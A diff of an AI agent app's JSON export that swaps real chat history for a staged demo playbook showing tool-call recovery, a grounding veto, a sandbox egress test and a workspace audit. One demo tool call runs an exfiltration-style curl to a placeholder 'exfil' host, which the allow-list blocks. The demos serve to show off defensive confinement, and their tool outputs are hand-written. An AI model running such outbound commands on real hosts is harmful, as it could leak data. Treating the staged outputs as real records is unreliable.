@@ -1,7 +1,7 @@
 {
   "version": 1,
-  "exportedAt": null,
-  "source": "hand-curated neutral fixtures",
+  "exportedAt": "2026-11-17T09:00:00.000Z",
+  "source": "steerable interactive demo playbook",
   "agents": [
     {
       "id": "local-assistant",
@@ -9,8 +9,8 @@
       "name": "Computer operator",
       "icon": "Cpu",
       "color": "#4f46e5",
-      "description": "Default local assistant. It can use the shell, files, and MCP tools.",
-      "rolePrompt": "You are **Computer operator**, a local offline assistant. Answer clearly and in steps that can be carried out.",
+      "description": "Default sandboxed assistant with shell, file, and MCP tool access.",
+      "rolePrompt": "You are **Computer operator**, a local sandboxed assistant. Verify with tools before answering.",
       "forbiddenPrompt": null,
       "skillIds": [],
       "toolPolicy": {
@@ -21,8 +21,8 @@
       "isBuiltin": true,
       "isArchived": false,
       "sortOrder": 0,
-      "createdAt": "2026-06-22T03:32:30.256Z",
-      "updatedAt": "2026-06-22T03:32:30.256Z"
+      "createdAt": "2026-11-01T08:00:00.000Z",
+      "updatedAt": "2026-11-01T08:00:00.000Z"
     },
     {
       "id": "data-analyst",
@@ -30,8 +30,8 @@
       "name": "Data analyst",
       "icon": "Activity",
       "color": "#0ea5e9",
-      "description": "Works on local CSV and log files: cleaning, stats, charts, and a summary.",
-      "rolePrompt": "You are **Data analyst**. You clean, summarize, and chart local data files.\nBe concise and lead with the conclusion.\n\nWorking rules:\n1) Inspect the file structure before changing it;\n2) Say what each step did;\n3) Present results as a table or bullets.",
+      "description": "Inspects CSV, logs, and benchmark tables with grounded summaries.",
+      "rolePrompt": "You are **Data analyst**. Inspect files first, cite observed numbers, and keep summaries concise.",
       "forbiddenPrompt": null,
       "skillIds": [],
       "toolPolicy": {
@@ -42,17 +42,17 @@
       "isBuiltin": true,
       "isArchived": false,
       "sortOrder": 1,
-      "createdAt": "2026-06-22T03:32:30.256Z",
-      "updatedAt": "2026-06-22T03:32:30.256Z"
+      "createdAt": "2026-11-01T08:00:00.000Z",
+      "updatedAt": "2026-11-01T08:00:00.000Z"
     },
     {
       "id": "all-round-assistant",
       "slug": "all-round-assistant",
       "name": "Assistant",
       "icon": "🔮",
-      "color": "#a855f7",
-      "description": "General agent. It loads every installed local skill and tool, with no extra trigger.",
-      "rolePrompt": "You are **Assistant**, with full access to every installed local skill.\nYou can run local commands (local_exec_shell), read and write files, and analyze data.\nEvery installed local skill and tool is already in your system prompt.\nCall the most direct local tool or script for the task.",
+      "color": "#16a34a",
+      "description": "General agent with all installed local skills and tools enabled.",
+      "rolePrompt": "You are **Assistant** with access to local shell, file tools, and installed skills.",
       "forbiddenPrompt": null,
       "skillIds": [],
       "toolPolicy": {
@@ -60,256 +60,174 @@
         "tools": []
       },
       "allowExternalSkills": true,
+      "loadAllSkills": true,
       "isBuiltin": true,
       "isArchived": false,
       "sortOrder": 2,
-      "createdAt": "2026-06-22T03:32:30.256Z",
-      "updatedAt": "2026-06-22T03:32:30.256Z"
+      "createdAt": "2026-11-01T08:00:00.000Z",
+      "updatedAt": "2026-11-01T08:00:00.000Z"
+    }
+  ],
+  "projects": [
+    {
+      "id": "proj-steerable-sandbox",
+      "name": "steerable-eval-sandbox",
+      "folderPath": "/workspace/steerable-eval-sandbox",
+      "sourceFolders": [],
+      "trusted": true,
+      "sortOrder": 0,
+      "createdAt": "2026-11-10T09:00:00.000Z",
+      "updatedAt": "2026-11-17T09:00:00.000Z"
     }
   ],
   "chats": [
     {
-      "id": "8286e3c8-2d83-409e-930a-3e99b2004d41",
-      "projectId": null,
-      "userId": "local",
-      "title": "Hello",
+      "id": "demo-chat-recovery",
+      "projectId": "proj-steerable-sandbox",
+      "userId": "demo",
+      "title": "Malformed tool call recovery (GLM-5.3-Flash)",
       "agentId": "local-assistant",
-      "createdAt": "2026-07-01T10:05:58.604Z",
-      "updatedAt": "2026-07-01T10:06:06.736Z",
+      "createdAt": "2026-11-17T08:50:00.000Z",
+      "updatedAt": "2026-11-17T08:50:14.000Z",
+      "isPinned": true,
+      "systemPrompt": null,
+      "pinnedRefs": null
+    },
+    {
+      "id": "demo-chat-grounding",
+      "projectId": "proj-steerable-sandbox",
+      "userId": "demo",
+      "title": "Grounding judge & completion veto",
+      "agentId": "local-assistant",
+      "createdAt": "2026-11-17T08:40:00.000Z",
+      "updatedAt": "2026-11-17T08:40:10.000Z",
       "isPinned": false,
       "systemPrompt": null,
       "pinnedRefs": null
     },
     {
-      "id": "8b13a92e-4b3e-4bac-885f-879ddd9e4835",
-      "projectId": null,
-      "userId": "local",
-      "title": "Enable the csv-data-tools skill",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T04:30:54.662Z",
-      "updatedAt": "2026-06-22T04:32:12.657Z",
+      "id": "demo-chat-sandbox",
+      "projectId": "proj-steerable-sandbox",
+      "userId": "demo",
+      "title": "OS sandbox & egress allow-list",
+      "agentId": "local-assistant",
+      "createdAt": "2026-11-17T08:30:00.000Z",
+      "updatedAt": "2026-11-17T08:30:08.000Z",
       "isPinned": false,
       "systemPrompt": null,
       "pinnedRefs": null
     },
     {
-      "id": "d536659c-6492-424d-97e8-2f701a9ce5d8",
-      "projectId": null,
-      "userId": "local",
-      "title": "New chat",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T04:19:52.607Z",
-      "updatedAt": "2026-06-22T04:20:00.151Z",
-      "isPinned": false,
-      "systemPrompt": null,
-      "pinnedRefs": null
-    },
-    {
-      "id": "4845b527-c9c9-467c-9d72-5fc5f8763aa5",
-      "projectId": null,
-      "userId": "local",
-      "title": "New chat",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T04:12:17.151Z",
-      "updatedAt": "2026-06-22T04:12:22.038Z",
-      "isPinned": false,
-      "systemPrompt": null,
-      "pinnedRefs": null
-    },
-    {
-      "id": "405f5964-f01c-4ece-9c8f-02a73d539469",
-      "projectId": null,
-      "userId": "local",
-      "title": "Enable the csv-data-tools skill",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T04:06:21.745Z",
-      "updatedAt": "2026-06-22T04:11:42.782Z",
-      "isPinned": false,
-      "systemPrompt": null,
-      "pinnedRefs": null
-    },
-    {
-      "id": "19a1d8e7-7e9c-425b-8509-0fe9dd292971",
-      "projectId": null,
-      "userId": "local",
-      "title": "Enable the csv-data-tools skill",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T04:01:21.158Z",
-      "updatedAt": "2026-06-22T04:05:08.801Z",
-      "isPinned": false,
-      "systemPrompt": null,
-      "pinnedRefs": null
-    },
-    {
-      "id": "492c1a80-85b2-486a-b365-3d668c9ad7e6",
-      "projectId": null,
-      "userId": "local",
-      "title": "New chat",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T03:44:47.381Z",
-      "updatedAt": "2026-06-22T03:44:54.479Z",
-      "isPinned": false,
-      "systemPrompt": null,
-      "pinnedRefs": null
-    },
-    {
-      "id": "4e997d62-20ef-4937-a866-27778dee3a17",
-      "projectId": null,
-      "userId": "local",
-      "title": "hi",
-      "agentId": "all-round-assistant",
-      "createdAt": "2026-06-22T03:34:36.892Z",
-      "updatedAt": "2026-06-22T03:37:37.601Z",
+      "id": "demo-chat-audit",
+      "projectId": "proj-steerable-sandbox",
+      "userId": "demo",
+      "title": "Workspace audit & deliverable export",
+      "agentId": "data-analyst",
+      "createdAt": "2026-11-17T08:20:00.000Z",
+      "updatedAt": "2026-11-17T08:20:11.000Z",
       "isPinned": false,
       "systemPrompt": null,
       "pinnedRefs": null
     }
   ],
   "messagesByChatId": {
-    "8286e3c8-2d83-409e-930a-3e99b2004d41": [
+    "demo-chat-recovery": [
       {
-        "id": "ea36a5de-e2e0-428b-b882-f5e67ca326b0",
-        "chatId": "8286e3c8-2d83-409e-930a-3e99b2004d41",
+        "id": "msg-rec-assistant-1",
+        "chatId": "demo-chat-recovery",
         "role": "assistant",
-        "content": "Hello. I am the **local assistant**, running on this computer.\n\nI can help with:\n\n**Local terminal**\n- Run shell commands and read or write files\n- Search a codebase and replace in bulk\n\n**Data**\n- Clean CSV and log files\n- Build a summary\n\nType what you want done.",
-        "createdAt": "2026-07-01T10:06:06.733Z",
-        "messageMetadata": "{\"traceId\":\"tr_269aa1b0f5244962b3279304d6f26323\",\"completionStatus\":\"completed\",\"trace\":{\"traceId\":\"tr_269aa1b0f5244962b3279304d6f26323\",\"sessionId\":\"8286e3c8-2d83-409e-930a-3e99b2004d41\",\"chatId\":\"8286e3c8-2d83-409e-930a-3e99b2004d41\",\"startedAtMs\":1782900364396,\"eventCount\":3,\"spanCount\":1,\"events\":[{\"name\":\"stream_start\",\"timestampMs\":1782900364396,\"data\":{\"path\":\"/api/v2/chats/8286e3c8-2d83-409e-930a-3e99b2004d41/run\",\"method\":\"POST\"}},{\"name\":\"completion_decision\",\"timestampMs\":1782900366733,\"data\":{\"status\":\"completed\",\"reason\":\"assistant produced final response with no pending tools\",\"confidence\":0.85,\"evidence\":[{\"textLength\":218,\"toolCalls\":[],\"toolErrorCount\":0}]}},{\"name\":\"stream_complete\",\"timestampMs\":1782900366733,\"data\":{\"usedTool\":false,\"completionStatus\":\"completed\",\"assistantLength\":218}}],\"spans\":[{\"name\":\"llm_call\",\"stepId\":\"step_1\",\"startMs\":1782900364396,\"endMs\":1782900366733,\"status\":\"ok\",\"data\":{\"turn\":0,\"model\":\"default\",\"tokensUsed\":{\"prompt\":8596,\"completion\":130,\"total\":8726},\"toolCalls\":0},\"durationMs\":2337}]},\"executedActions\":[]}"
+        "content": "Fixed via **Steerable malformed-call recovery** (`glm-5.3-flash @high`):\n\n1. **Recovered text call**: Round 1 emitted `<function=local_exec_shell>` as plain text; CoreLoop parsed and ran it instead of dropping the turn.\n2. **Patched root cause**: `src/parser.py` truncated nested unclosed tags before JSON decoding.\n3. **Verified**: `pytest tests/test_parser.py -q` -> `12 passed in 0.41s`.",
+        "createdAt": "2026-11-17T08:50:14.000Z",
+        "messageMetadata": "{\"completionStatus\":\"completed\",\"durationMs\":2410,\"executedActions\":[{\"id\":\"rec-1\",\"tool\":\"local_exec_shell\",\"mode\":\"recovered_xml\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"arguments\":{\"command\":\"pytest tests/test_parser.py -q\"},\"result\":{\"success\":false,\"exitCode\":1,\"output\":\"FAILED tests/test_parser.py::test_nested_tag_recovery - AssertionError: unclosed tag\"}},{\"id\":\"rec-2\",\"tool\":\"local_read_file\",\"arguments\":{\"path\":\"src/parser.py\",\"startLine\":40,\"endLine\":72},\"result\":{\"success\":true,\"output\":\"Read 33 lines from src/parser.py (recover_xml_tool_calls).\"}},{\"id\":\"rec-3\",\"tool\":\"local_write_file\",\"arguments\":{\"path\":\"src/parser.py\",\"summary\":\"Normalize trailing partial XML tag before JSON parse\"},\"result\":{\"success\":true,\"output\":\"Updated src/parser.py (+4 / -1 lines).\"}},{\"id\":\"rec-4\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"arguments\":{\"command\":\"pytest tests/test_parser.py -q\"},\"result\":{\"success\":true,\"exitCode\":0,\"output\":\"12 passed in 0.41s\"}}],\"timeline\":[{\"type\":\"reasoning\",\"content\":\"Round 1 emitted a plain-text <function=local_exec_shell> block instead of structured tool_calls. Steerable recovered and executed the command inside Seatbelt.\"},{\"type\":\"tools\",\"actions\":[{\"id\":\"rec-1\",\"tool\":\"local_exec_shell\",\"mode\":\"recovered_xml\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"arguments\":{\"command\":\"pytest tests/test_parser.py -q\"},\"result\":{\"success\":false,\"exitCode\":1,\"output\":\"FAILED tests/test_parser.py::test_nested_tag_recovery - AssertionError: unclosed tag\"}},{\"id\":\"rec-2\",\"tool\":\"local_read_file\",\"arguments\":{\"path\":\"src/parser.py\",\"startLine\":40,\"endLine\":72},\"result\":{\"success\":true,\"output\":\"Read 33 lines from src/parser.py (recover_xml_tool_calls).\"}},{\"id\":\"rec-3\",\"tool\":\"local_write_file\",\"arguments\":{\"path\":\"src/parser.py\",\"summary\":\"Normalize trailing partial XML tag before JSON parse\"},\"result\":{\"success\":true,\"output\":\"Updated src/parser.py (+4 / -1 lines).\"}},{\"id\":\"rec-4\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"arguments\":{\"command\":\"pytest tests/test_parser.py -q\"},\"result\":{\"success\":true,\"exitCode\":0,\"output\":\"12 passed in 0.41s\"}}]}],\"usage\":{\"promptTokens\":6420,\"completionTokens\":485,\"totalTokens\":6905,\"cachedPromptTokens\":4100,\"costUsd\":0.0014},\"suggestedReplies\":[\"Test the grounding judge & completion veto\",\"Check OS sandbox & egress allow-list denial\",\"Audit workspace and export audit-report.md\"]}"
       },
       {
-        "id": "ab1387a6-5c43-4d4b-986d-073d98b3f5e2",
-        "chatId": "8286e3c8-2d83-409e-930a-3e99b2004d41",
+        "id": "msg-rec-user-1",
+        "chatId": "demo-chat-recovery",
         "role": "user",
-        "content": "Hello",
-        "createdAt": "2026-07-01T10:06:04.392Z",
+        "content": "Fix the failing parser test even if the model outputs malformed tool calls.",
+        "createdAt": "2026-11-17T08:50:00.000Z",
         "messageMetadata": null
       }
     ],
-    "8b13a92e-4b3e-4bac-885f-879ddd9e4835": [
+    "demo-chat-grounding": [
       {
-        "id": "6599eb84-515c-4f58-bec8-0f37fcfbb234",
-        "chatId": "8b13a92e-4b3e-4bac-885f-879ddd9e4835",
+        "id": "msg-gnd-assistant-1",
+        "chatId": "demo-chat-grounding",
         "role": "assistant",
-        "content": "I'll look at the modules in `csv-data-tools`.\n\n**`csv-data-tools`** is ready:\n\n---\n\n## csv-data-tools\n\n- `csv_stats` — column stats (rows, missing values, distribution)\n- `csv_filter` — filter and export\n- `csv_plot` — a quick chart\n\nSend a file path to start.",
-        "createdAt": "2026-06-22T04:32:11.576Z",
-        "messageMetadata": null
+        "content": "Result: **`/health` is not returning `200` — it returned `503`**.\n\n- **Veto triggered**: The initial ungrounded \"all endpoints healthy\" draft was rejected by the Grounding Judge (`veto: retry`).\n- **Verified evidence**: `curl` returned `503`, and `logs/health-check.log` reports `worker_pool` failed to initialize (`missing SQLITE_TMPDIR`).",
+        "createdAt": "2026-11-17T08:40:10.000Z",
+        "messageMetadata": "{\"completionStatus\":\"completed\",\"durationMs\":1840,\"executedActions\":[{\"id\":\"gnd-1\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"arguments\":{\"command\":\"curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:4787/health\"},\"result\":{\"success\":false,\"exitCode\":1,\"output\":\"503\"}},{\"id\":\"gnd-2\",\"tool\":\"local_read_file\",\"arguments\":{\"path\":\"logs/health-check.log\",\"startLine\":1,\"endLine\":12},\"result\":{\"success\":true,\"output\":\"ERROR worker_pool: sidecar warm-up failed (missing SQLITE_TMPDIR)\"}}],\"timeline\":[{\"type\":\"reasoning\",\"content\":\"Initial draft claimed 200 OK without calling any tool. Completion veto returned retry, forcing a live check.\"},{\"type\":\"tools\",\"actions\":[{\"id\":\"gnd-1\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"arguments\":{\"command\":\"curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:4787/health\"},\"result\":{\"success\":false,\"exitCode\":1,\"output\":\"503\"}},{\"id\":\"gnd-2\",\"tool\":\"local_read_file\",\"arguments\":{\"path\":\"logs/health-check.log\",\"startLine\":1,\"endLine\":12},\"result\":{\"success\":true,\"output\":\"ERROR worker_pool: sidecar warm-up failed (missing SQLITE_TMPDIR)\"}}]}],\"usage\":{\"promptTokens\":5180,\"completionTokens\":340,\"totalTokens\":5520,\"cachedPromptTokens\":3200,\"costUsd\":0.0011},\"suggestedReplies\":[\"Demo malformed tool call recovery\",\"Check OS sandbox & egress allow-list denial\",\"Audit workspace and export audit-report.md\"]}"
       },
       {
-        "id": "a6d5f510-e26c-4fd5-878b-74ea98a977f9",
-        "chatId": "8b13a92e-4b3e-4bac-885f-879ddd9e4835",
+        "id": "msg-gnd-user-1",
+        "chatId": "demo-chat-grounding",
         "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T04:31:01.151Z",
+        "content": "Verify whether /health is returning 200 OK and cite real check output.",
+        "createdAt": "2026-11-17T08:40:00.000Z",
         "messageMetadata": null
       }
     ],
-    "d536659c-6492-424d-97e8-2f701a9ce5d8": [
+    "demo-chat-sandbox": [
       {
-        "id": "9b04bf0c-2d90-4e27-b891-9871207d177e",
-        "chatId": "d536659c-6492-424d-97e8-2f701a9ce5d8",
-        "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T04:20:00.151Z",
-        "messageMetadata": null
-      }
-    ],
-    "4845b527-c9c9-467c-9d72-5fc5f8763aa5": [
-      {
-        "id": "abb7c501-67d1-4ca4-8d94-708bbd55646f",
-        "chatId": "4845b527-c9c9-467c-9d72-5fc5f8763aa5",
-        "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T04:12:22.038Z",
-        "messageMetadata": null
-      }
-    ],
-    "405f5964-f01c-4ece-9c8f-02a73d539469": [
-      {
-        "id": "c8dc9e96-642b-4232-8c3c-c8abc32a615c",
-        "chatId": "405f5964-f01c-4ece-9c8f-02a73d539469",
+        "id": "msg-sbx-assistant-1",
+        "chatId": "demo-chat-sandbox",
         "role": "assistant",
-        "content": "I'll check the MCP tools for `csv-data-tools`.\n\nIt is not registered as its own MCP server. I'll scan local scripts and executables instead.\n\nIt is not installed. Import it from the skills settings.",
-        "createdAt": "2026-06-22T04:11:42.077Z",
-        "messageMetadata": null
+        "content": "Verified fail-closed sandbox & egress boundaries:\n\n- **Workspace command**: `ls -la` succeeded inside Seatbelt confinement.\n- **Untrusted egress**: `curl https://exfil.untrusted.example/dump` was blocked by the per-host CONNECT proxy (`EGRESS_DENIED`, exit `126`).",
+        "createdAt": "2026-11-17T08:30:08.000Z",
+        "messageMetadata": "{\"completionStatus\":\"completed\",\"durationMs\":1420,\"executedActions\":[{\"id\":\"sbx-1\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"shellClassification\":\"workspace_read\",\"arguments\":{\"command\":\"ls -la /workspace/steerable-eval-sandbox\"},\"result\":{\"success\":true,\"exitCode\":0,\"output\":\"README.md  package.json  src/  tests/\"}},{\"id\":\"sbx-2\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"shellClassification\":\"egress_network\",\"arguments\":{\"command\":\"curl -fsS https://exfil.untrusted.example/dump\"},\"result\":{\"success\":false,\"exitCode\":126,\"output\":\"EGRESS_DENIED: host exfil.untrusted.example is not in CONNECT allow-list\"}}],\"timeline\":[{\"type\":\"reasoning\",\"content\":\"Workspace commands stay confined to /workspace/steerable-eval-sandbox; unallowlisted hosts fail closed at the egress proxy.\"},{\"type\":\"tools\",\"actions\":[{\"id\":\"sbx-1\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"shellClassification\":\"workspace_read\",\"arguments\":{\"command\":\"ls -la /workspace/steerable-eval-sandbox\"},\"result\":{\"success\":true,\"exitCode\":0,\"output\":\"README.md  package.json  src/  tests/\"}},{\"id\":\"sbx-2\",\"tool\":\"local_exec_shell\",\"sandbox\":{\"backend\":\"seatbelt\",\"enforcement\":\"full\"},\"shellClassification\":\"egress_network\",\"arguments\":{\"command\":\"curl -fsS https://exfil.untrusted.example/dump\"},\"result\":{\"success\":false,\"exitCode\":126,\"output\":\"EGRESS_DENIED: host exfil.untrusted.example is not in CONNECT allow-list\"}}]}],\"usage\":{\"promptTokens\":4390,\"completionTokens\":295,\"totalTokens\":4685,\"cachedPromptTokens\":2800,\"costUsd\":0.0009},\"suggestedReplies\":[\"Demo malformed tool call recovery\",\"Test the grounding judge & completion veto\",\"Audit workspace and export audit-report.md\"]}"
       },
       {
-        "id": "d4c21f8f-b4ab-4dc0-bc48-611bc66847a4",
-        "chatId": "405f5964-f01c-4ece-9c8f-02a73d539469",
+        "id": "msg-sbx-user-1",
+        "chatId": "demo-chat-sandbox",
         "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T04:06:27.797Z",
+        "content": "Inspect sandbox posture and test blocking an untrusted egress host.",
+        "createdAt": "2026-11-17T08:30:00.000Z",
         "messageMetadata": null
       }
     ],
-    "19a1d8e7-7e9c-425b-8509-0fe9dd292971": [
+    "demo-chat-audit": [
       {
-        "id": "cfb0f03c-7faa-4594-b29f-f4c11fb09105",
-        "chatId": "19a1d8e7-7e9c-425b-8509-0fe9dd292971",
+        "id": "msg-aud-assistant-1",
+        "chatId": "demo-chat-audit",
         "role": "assistant",
-        "content": "The local model call failed: could not reach the OpenAI-compatible gateway (https://api.deepseek.com). Check baseUrl and the network. Original error: fetch failed",
-        "createdAt": "2026-06-22T04:05:06.751Z",
-        "messageMetadata": null
+        "content": "Workspace audit finished and exported `audit-report.md` (click the deliverable card below to download):\n\n- **Sidecar contract**: 38 JSON-RPC methods match protocol schema.\n- **Confinement**: Seatbelt + per-host CONNECT egress allow-list active.\n- **Quality guards**: Malformed call recovery & grounding veto enabled.",
+        "createdAt": "2026-11-17T08:20:11.000Z",
+        "messageMetadata": "{\"completionStatus\":\"completed\",\"durationMs\":2150,\"executedActions\":[{\"id\":\"aud-1\",\"tool\":\"local_read_file\",\"arguments\":{\"path\":\"docs/spec/runtime-contract.json\"},\"result\":{\"success\":true,\"output\":\"sidecarRpcMethods: 38, protocolVersion: 1\"}},{\"id\":\"aud-2\",\"tool\":\"local_write_file\",\"arguments\":{\"path\":\"/workspace/steerable-eval-sandbox/audit-report.md\"},\"result\":{\"success\":true,\"output\":\"Wrote 512 bytes to audit-report.md.\"}}],\"timeline\":[{\"type\":\"reasoning\",\"content\":\"Reading runtime contract metadata and writing audit-report.md as a downloadable turn deliverable.\"},{\"type\":\"tools\",\"actions\":[{\"id\":\"aud-1\",\"tool\":\"local_read_file\",\"arguments\":{\"path\":\"docs/spec/runtime-contract.json\"},\"result\":{\"success\":true,\"output\":\"sidecarRpcMethods: 38, protocolVersion: 1\"}},{\"id\":\"aud-2\",\"tool\":\"local_write_file\",\"arguments\":{\"path\":\"/workspace/steerable-eval-sandbox/audit-report.md\"},\"result\":{\"success\":true,\"output\":\"Wrote 512 bytes to audit-report.md.\"}}]}],\"turnFiles\":[{\"path\":\"/workspace/steerable-eval-sandbox/audit-report.md\",\"kind\":\"created\",\"size\":512,\"additions\":15,\"category\":\"deliverable\",\"selection\":\"resolved\",\"deliverySource\":\"present-files\",\"description\":\"Workspace architecture & sandbox audit\"}],\"usage\":{\"promptTokens\":7120,\"completionTokens\":540,\"totalTokens\":7660,\"cachedPromptTokens\":4900,\"costUsd\":0.0017},\"suggestedReplies\":[\"Demo malformed tool call recovery\",\"Test grounding judge & completion veto\",\"Test OS sandbox & egress allow-list denial\"]}"
       },
       {
-        "id": "2d7469fc-1a58-488b-beb8-c372e54e3def",
-        "chatId": "19a1d8e7-7e9c-425b-8509-0fe9dd292971",
+        "id": "msg-aud-user-1",
+        "chatId": "demo-chat-audit",
         "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T04:01:55.866Z",
-        "messageMetadata": null
-      }
-    ],
-    "492c1a80-85b2-486a-b365-3d668c9ad7e6": [
-      {
-        "id": "6ca59f0c-6df7-4747-9c96-80812d459a96",
-        "chatId": "492c1a80-85b2-486a-b365-3d668c9ad7e6",
-        "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T03:44:54.479Z",
-        "messageMetadata": null
-      }
-    ],
-    "4e997d62-20ef-4937-a866-27778dee3a17": [
-      {
-        "id": "c5d6136b-eaa4-4cc7-878b-450099b7d226",
-        "chatId": "4e997d62-20ef-4937-a866-27778dee3a17",
-        "role": "assistant",
-        "content": "I'll check the MCP tools for `csv-data-tools`.\n\nIt is not registered as its own MCP server. I'll scan local scripts and executables instead.\n\nIt is not installed. Import it from the skills settings.",
-        "createdAt": "2026-06-22T03:37:37.601Z",
-        "messageMetadata": null
-      },
-      {
-        "id": "68f12c35-7de5-49f3-af14-ca5deae13dee",
-        "chatId": "4e997d62-20ef-4937-a866-27778dee3a17",
-        "role": "user",
-        "content": "/csv-data-tools",
-        "createdAt": "2026-06-22T03:36:49.529Z",
-        "messageMetadata": null
-      },
-      {
-        "id": "fa89030e-5db1-4d04-9320-e796baeb89e2",
-        "chatId": "4e997d62-20ef-4937-a866-27778dee3a17",
-        "role": "assistant",
-        "content": "Hello. I am the **local assistant**, running on this computer.\n\nI can help with:\n\n**Local terminal**\n- Run shell commands and read or write files\n- Search a codebase and replace in bulk\n\n**Data**\n- Clean CSV and log files\n- Build a summary\n\nType what you want done.",
-        "createdAt": "2026-06-22T03:34:48.778Z",
-        "messageMetadata": "{\"traceId\":\"tr_f53c2142bbd347b5888f9d50c5444478\",\"completionStatus\":\"completed\",\"trace\":{\"traceId\":\"tr_f53c2142bbd347b5888f9d50c5444478\",\"sessionId\":\"4e997d62-20ef-4937-a866-27778dee3a17\",\"chatId\":\"4e997d62-20ef-4937-a866-27778dee3a17\",\"startedAtMs\":1782099286405,\"eventCount\":3,\"spanCount\":1,\"events\":[{\"name\":\"stream_start\",\"timestampMs\":1782099286405,\"data\":{\"path\":\"/api/v2/chats/4e997d62-20ef-4937-a866-27778dee3a17/run\",\"method\":\"POST\"}},{\"name\":\"completion_decision\",\"timestampMs\":1782099288778,\"data\":{\"status\":\"completed\",\"reason\":\"assistant produced final response with no pending tools\",\"confidence\":0.85,\"evidence\":[{\"textLength\":224,\"toolCalls\":[],\"toolErrorCount\":0}]}},{\"name\":\"stream_complete\",\"timestampMs\":1782099288778,\"data\":{\"usedTool\":false,\"completionStatus\":\"completed\",\"assistantLength\":224}}],\"spans\":[{\"name\":\"llm_call\",\"stepId\":\"step_1\",\"startMs\":1782099286405,\"endMs\":1782099288777,\"status\":\"ok\",\"data\":{\"turn\":0,\"model\":\"default\",\"tokensUsed\":{\"prompt\":2234,\"completion\":130,\"total\":2364},\"toolCalls\":0},\"durationMs\":2372}]},\"executedActions\":[]}"
-      },
-      {
-        "id": "82c95340-1d74-49fe-abe7-2184aeab9f8c",
-        "chatId": "4e997d62-20ef-4937-a866-27778dee3a17",
-        "role": "user",
-        "content": "hi",
-        "createdAt": "2026-06-22T03:34:46.403Z",
+        "content": "Audit this sandbox workspace and generate audit-report.md.",
+        "createdAt": "2026-11-17T08:20:00.000Z",
         "messageMetadata": null
       }
     ]
   },
   "llmSettings": {
     "provider": "openai-compat",
-    "model": "deepseek-chat",
-    "baseUrl": "https://api.deepseek.com",
+    "vendorId": "openrouter",
+    "model": "glm-5.3-flash",
+    "baseUrl": "https://openrouter.ai/api/v1",
     "apiKey": "",
     "temperature": 0.3,
-    "systemPrompt": "You are a local assistant. Prefer advice that can be carried out, and call local tools when that helps."
+    "maxTotalTokens": 60000
   },
-  "skills": []
+  "skills": [
+    {
+      "name": "tool-recovery",
+      "description": "Parses malformed XML and text tool calls into structured dispatches.",
+      "builtin": true
+    },
+    {
+      "name": "grounding-judge",
+      "description": "Verifies completion drafts against observed tool outputs before delivery.",
+      "builtin": true
+    },
+    {
+      "name": "sandbox-audit",
+      "description": "Inspects OS confinement and egress allow-list posture.",
+      "builtin": true
+    }
+  ]
 }
